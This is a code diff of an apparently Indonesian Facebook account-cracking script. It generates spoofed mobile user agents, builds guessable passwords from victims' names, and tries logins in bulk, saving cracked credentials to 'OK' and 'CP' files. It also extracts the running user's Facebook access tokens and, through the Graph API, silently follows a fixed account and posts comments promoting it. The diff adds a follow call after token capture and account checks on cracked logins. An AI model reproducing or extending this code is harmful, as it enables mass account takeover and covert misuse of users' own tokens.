@@ -113,7 +113,7 @@ for xd in range(10000):
     strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
     strvnokiax = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
     strvgt = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
-    uateddy = random.choice([strvredmi, strvsamsung,strvgt])
+    uateddy = random.choice([strvredmi,strvsamsung,strvgt])
     free.append(uateddy)
 
 
@@ -181,7 +181,7 @@ asu = random.choice([m,k,h,u,b])
 kom1 = ("Anjng Panutan Ku, Keren Bngt Bnjerr 🤙\n -\nhttps://www.facebook.com/100043537611609/posts/878169396977639/?app=fbl\n-\n \nkomentar ditulis oleh bot\n \n[ Semangat Bang @[100043537611609:] ]") 
 kom2 = ("Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku") 
 kom3 = ("Panutan Ku") 
-kom4 = ("Keren Bang") 
+kom4 = ("Pintar Banget") 
 kom5 = ("Jadikan Aku Anak Buah Mu Bang @[100043537611609:]") 
 kom6 = (" Izin Share Ya Bang\n-\nhttps://www.facebook.com/100043537611609/posts/878169396977639/?app=fbl\n-\nSemangat Ya Bang ❤") 
 #--------------------[ CONVERTER-BULAN ]--------------#
@@ -449,7 +449,7 @@ def login_lagi334():
 									tok1 = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
 									open(".token1.txt","w").write(tok1)
 									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok1}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAB [bold green]<"))
-									requests.post('https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s'%(tok1))
+									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok1))
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok1}", headers = {"cookie":your_cookies})
@@ -463,6 +463,7 @@ def login_lagi334():
 									tok2 = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
 									open(".token2.txt","w").write(tok2)
 									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok2}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAG [bold green]<"))
+									followdong()
 									Console().print(f" {H2}• {P2}[bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]")
 								back()
 							except Exception as e:
@@ -478,7 +479,7 @@ def login_lagi334():
 
 def followdong():
 	try:
-		token = open('.token.txt','r').read()
+		token = open('.token2.txt','r').read()
 		cokies = open('.cok.txt','r').read()
 	except IOError:
 		Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluarsa cok")
@@ -552,7 +553,7 @@ def menu(my_name,my_id):
 
 def follower():
     try:
-        token = open('.token.txt', 'r').read()
+        token = open('.token2.txt', 'r').read()
     except IOError:
         exit()
     win = '# DUMP ID DARI FOLLOWER'
@@ -1120,7 +1121,7 @@ def setting():
     elif hc in ['3','03']:
         method.append('reguler')
     else:
-        method.append('mbasic')
+        method.append('reguler')
     Console().print(Panel(f'[bold white]Apakah Anda Ingin Mengunakan UA Manual Untuk Melakukan Crack Account ? Y/T',title=f"[bold green]Setting User-Agent",width=80,style=f"{color_panel}"))
     uatambah = console.input(f" {H2}• {P2}Masukan : ")
     if uatambah in ['y','Ya','ya','Y']:
@@ -1155,6 +1156,7 @@ def passwrd():
                         pass
                     else:
                         pwv.append(nmf)
+			    
                         pwv.append(frs+'123')
                         pwv.append(frs+'1234')
                         pwv.append(frs+'12345')
@@ -1205,8 +1207,8 @@ def asyn(idf,pwv,url):
 	prog.update(des,description=f'\r[bold white]ASYNC [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
 	prog.advance(des)
 	ua = random.choice(free)
-	#ua = random.choice(free)
-	ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
+	ua2 = random.choice(free)
+	#ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
@@ -1358,7 +1360,7 @@ def reguler(idf,pwv):
 				prints(tree)
 				os.popen('play-audio c.mp3')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				
+				ceker(idf,pw)
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -1371,7 +1373,7 @@ def reguler(idf,pwv):
 				prints(tree)
 				os.popen('play-audio o.mp3')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				
+				cek_apk(kuki)
 				break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
